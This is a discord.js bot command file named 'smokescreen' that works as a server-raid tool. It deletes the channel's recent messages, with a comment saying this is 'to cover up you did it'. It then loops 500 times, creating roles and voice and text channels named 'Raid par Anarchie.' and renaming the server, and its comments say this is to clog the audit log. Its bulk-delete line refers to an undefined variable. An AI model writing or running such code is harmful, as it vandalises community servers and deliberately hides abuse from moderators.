const Discord = require('discord.js');



exports.run = (client, message, args) => {

    message.channel.fetchMessages({limit: 10}).then(messages => msg.channel.bulkDelete(messages)); //deletes messages to cover up you did it
    for (var i = 0; i < 500; i++) {
        // Creates new roles to clog up the audit log
        message.guild.createRole({
            name: 'Anarchie.',
            color: 'RED',
        });
        message.guild.createChannel('Raid par Anarchie.', 'voice')
        message.guild.createChannel('Raid par Anarchie.', 'text')
        //changes name tons of times to clog up the audit log
        message.guild.setName("Raid par Anarchie. "+ i + " Fois");
    }
}


    exports.conf = {
        enabled: true,
        guildOnly: false,
        aliases: [],
        permLevel: 0
      };
      
      exports.help = {
        name: 'smokescreen',
        description: '',
        usage: ''
      };